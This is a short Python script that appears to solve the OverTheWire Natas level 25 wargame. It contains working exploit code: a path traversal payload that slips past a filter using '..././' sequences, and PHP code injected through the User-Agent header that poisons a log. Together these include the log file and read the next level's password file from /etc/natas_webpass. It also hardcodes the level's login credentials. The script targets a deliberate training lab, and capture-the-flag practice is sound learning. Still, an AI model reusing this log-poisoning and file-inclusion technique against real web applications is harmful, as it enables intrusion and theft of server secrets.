# -*- coding: utf8 -*-

import requests

url = "http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././tmp/natas25_lolilol.log"
auth = ('natas25', "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

headers = {"user-agent" :  "<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>"}
cookie = {"PHPSESSID": "lolilol"}

r = requests.put(url , auth=auth, cookies=cookie, headers=headers)

print(r.text)
print(r.headers)
